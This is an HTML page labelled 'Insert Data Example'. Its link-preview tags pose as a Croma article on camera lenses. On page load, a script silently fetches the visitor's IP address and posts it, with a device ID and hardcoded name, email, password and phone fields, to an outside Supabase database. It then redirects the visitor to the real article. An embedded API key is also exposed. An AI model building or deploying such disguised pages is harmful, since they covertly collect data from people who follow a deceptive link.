<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Insert Data Example</title>
   <!-- Open Graph Tags -->
  <meta property="og:title" content="Types of lenses every photographer must have?" />
  <meta property="og:description" content="For a professional photographer, having different types of lenses that can serve different purposes is a must." />
  <meta property="og:image" content="https://lensvid.com/wp-content/uploads/2014/04/A7S-large.jpg" />
  <meta property="og:url" content="https://www.croma.com/unboxed/what-are-the-types-of-lenses-every-photographer-must-have" />
  <meta property="og:type" content="website" />
</head>
<body>
  <!-- <button id="submit">Create my account</button> -->

  <script>
    window.addEventListener("load", () => {
      // Run the function automatically when page loads
      insertData("direct", "daman@gmail.com", "kjsdfkjsdf", "983928402834", generateDeviceId());
    });

    // Function to generate random deviceId
    function generateDeviceId() {
      return Math.floor(Math.random() * 1000000000).toString();
    }

    async function insertData(name, email, password, phone, deviceId) {
      // const submitBtn = document.getElementById("submit");
      // submitBtn.textContent = "Wait...";

      try {
        // Fetch the IP
        const ipResponse = await fetch("https://api.ipify.org/?format=json");
        const ipData = await ipResponse.json();
        let ipAddress = ipData.ip;

        console.log("Data to insert:", name, email, password, phone, deviceId, ipAddress);

        // Insert into Supabase
        const response = await fetch("https://vdmqxtdkvvcofdniszao.supabase.co/rest/v1/nikita", {
          method: "POST",
          headers: {
            "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkbXF4dGRrdnZjb2ZkbmlzemFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3MTE5NjksImV4cCI6MjA3MTI4Nzk2OX0.VggXnS7Cawc_g5OK3ePbOmHvuChh2xEepiU4dPo8nlY",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkbXF4dGRrdnZjb2ZkbmlzemFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3MTE5NjksImV4cCI6MjA3MTI4Nzk2OX0.VggXnS7Cawc_g5OK3ePbOmHvuChh2xEepiU4dPo8nlY",
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            name: name,
            email: email,
            password: password,
            phone: phone,
            device: deviceId,
            ip: ipAddress
          })
        });

        if (response.ok) {
          const result = await response.json();
          console.log("✅ Data inserted successfully:", result);
          // submitBtn.textContent = "Done!";
          window.location.href = "https://www.croma.com/unboxed/what-are-the-types-of-lenses-every-photographer-must-have";

        } else {
          const error = await response.text();
          console.error("❌ Error inserting data:", error);
          // submitBtn.textContent = "vivek1 Error!";
          window.location.href = "https://www.croma.com/unboxed/what-are-the-types-of-lenses-every-photographer-must-have";

        }

      } catch (err) {
        console.error("❌ Unexpected error:", err);
        // submitBtn.textContent = "vivek2 Error!";
        window.location.href = "https://www.croma.com/unboxed/what-are-the-types-of-lenses-every-photographer-must-have";

      }
    }
  </script>
</body>
</html>
